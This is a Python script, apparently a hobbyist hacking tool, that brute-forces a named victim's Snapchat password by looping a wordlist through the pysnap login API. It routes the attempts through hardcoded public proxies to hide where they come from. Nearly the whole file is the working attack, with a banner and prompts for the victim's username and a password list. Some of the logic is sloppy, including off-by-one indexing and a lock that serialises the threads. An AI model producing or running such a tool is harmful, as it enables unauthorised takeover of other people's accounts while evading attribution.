import sys
import os
import requests
import random
from itertools import cycle
import threading
from queue import Queue
import time
from pysnap import Snapchat
# pip install requests[socks]
# brew install tor

name_of_file = sys.argv[0]
working_proxies = []

print("""

  _____ ____    ____  ____  _____   ___   ____       __    ___
 / ___/|    \  /    ||    \|     | /   \ |    \    /    ] /  _]
(   \_ |  _  ||  o  ||  o  )   __||     ||  D  )  /    / /  [_
 \__  ||  |  ||     ||   _/|  |_  |  O  ||    /  |    /  |    _]
 /  \ ||  |  ||  _  ||  |  |   _] |     ||    \  |    \_ |   [_
 \    ||  |  ||  |  ||  |  |  |   |     ||  .  \ \     | |     |
  \___||__|__||__|__||__|  |__|    \___/ |__|\_|  \____| |_____|

by BalonTheHacker
""")


##User input

snap_name = input("What is the victims snapchat username? ")
password_list = input("What is the path to the password list? ")
try:
    password_list = open(password_list).readlines()
except:
    print("path invalid")
    quit()
number_of_threads = input("How many threads would you like to run? (Recommended 10): ")

dir_path = os.path.dirname(os.path.realpath(__file__))
#Connecting to a proxy with urllib3
print("Connecting to Proxy")
proxy_list = open(dir_path + "/proxies.txt", 'r').readlines()

proxies1 = ['52.194.26.48:8080',
'87.244.176.213:53545']
proxy_pool = cycle(proxies1)

url = "https://httpbin.org/ip"
for i in range(len(proxies1)):
    #Get a proxy from the pool
    proxy = next(proxy_pool)
    try:
        response = requests.get(url,proxies={"http": proxy, "https": proxy})
        print(response.json())
        working_proxies.append(proxy)
    except:
        pass;
lenght_of_proxy = len(working_proxies)

number_of_proxy_rand = random.randint(0,lenght_of_proxy-1)

number_of_proxy_rand = number_of_proxy_rand
proxies = {
    'http':  working_proxies[number_of_proxy_rand],
    'https': working_proxies[number_of_proxy_rand],
}

# Create the session and set the proxies.
s = Snapchat()
l = requests.Session()
l.proxies = proxies

r = l.get("https://httpbin.org/ip")
print("your connecting through: ", r.text)


print("ATTEMPTING BRUTEFORCE")
login_lock = threading.Lock()
def threader():
    while True:
        worker = q.get()
        bruting(worker)
        q.task_done()

def bruting(worker):
    time.sleep(0.5)
    with login_lock:
        for i in range(len(password_list)) :
            print("\n", "Username: ", snap_name, "\n","Trying Password: ", str(password_list[i-1]), "\n", str(i-1), "passwords tried out of", len(password_list))
            try :
                s.login(snap_name, password_list[i-1])
                print("Password found, password for", snap_name, "is:", password_list[i-1])
                quit()
            except :
                pass


q = Queue()

for x in range(int(number_of_threads)) :
    t = threading.Thread(target = threader)
    t.daemon = True
    t.start()

start = time.time()

for worker in range(len(password_list)) :
    q.put(worker)
q.join()
